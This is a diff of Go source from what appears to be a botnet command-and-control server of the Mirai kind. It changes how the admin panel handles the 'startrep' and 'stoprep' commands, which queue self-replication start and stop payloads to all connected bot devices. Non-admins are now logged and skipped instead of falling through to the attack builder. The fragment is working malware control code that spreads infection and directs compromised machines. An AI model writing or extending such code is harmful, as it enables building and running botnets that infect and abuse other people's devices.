@@ -397,27 +397,36 @@ func (this *Admin) Handle() {
 			} else {
 				AttackCount = clientList.Count()
 			}
-			if isAdmin(userInfo) && cmd == strings.ToLower("startrep") {
-				fmt.Println("" + username + " tried to start selfrep")
-				this.conn.Write([]byte(fmt.Sprintf("\033[1;37mInitiating start SelfREP With \033[1;36m%d \033[1;37mConnected Devices\033[1;37m\r\n", AttackCount)))
-				buf, err := atk.Build_Startrep()
-				if err != nil {
-					this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
+			if cmd == strings.ToLower("startrep") {
+				if isAdmin(userInfo) {
+					fmt.Println("" + username + " tried to start selfrep")
+					this.conn.Write([]byte(fmt.Sprintf("\033[1;37mInitiating start SelfREP With \033[1;36m%d \033[1;37mConnected Devices\033[1;37m\r\n", AttackCount)))
+					buf, err := atk.Build_Startrep()
+					if err != nil {
+						this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
+						continue
+					}
+					clientList.QueueBuf(buf, botCount, botCatagory)
+					continue
+				} else {
+					fmt.Println("" + username + " tried to start selfrep and isnt admin")
 					continue
 				}
-				clientList.QueueBuf(buf, botCount, botCatagory)
-				continue
 			}
-			if isAdmin(userInfo) && cmd == strings.ToLower("stoprep") {
-				fmt.Println("" + username + " tried to stop selfrep")
-				this.conn.Write([]byte(fmt.Sprintf("\033[1;37mInitiating stop SelfREP With \033[1;36m%d \033[1;37mConnected Devices\033[1;37m\r\n", AttackCount)))
-				buf, err := atk.Build_Stoprep()
-				if err != nil {
-					this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
+			if cmd == strings.ToLower("stoprep") {
+			    if isAdmin(userInfo) {
+					fmt.Println("" + username + " tried to stop selfrep")
+					this.conn.Write([]byte(fmt.Sprintf("\033[1;37mInitiating stop SelfREP With \033[1;36m%d \033[1;37mConnected Devices\033[1;37m\r\n", AttackCount)))
+					buf, err := atk.Build_Stoprep()
+					if err != nil {
+						this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
+						continue
+					}
+					clientList.QueueBuf(buf, botCount, botCatagory)
 					continue
+				} else {
+					fmt.Println("" + username + " tried to stop selfrep and isnt admin")
 				}
-				clientList.QueueBuf(buf, botCount, botCatagory)
-				continue
 			}
 			buf, err := atk.Build()
 			if err != nil {
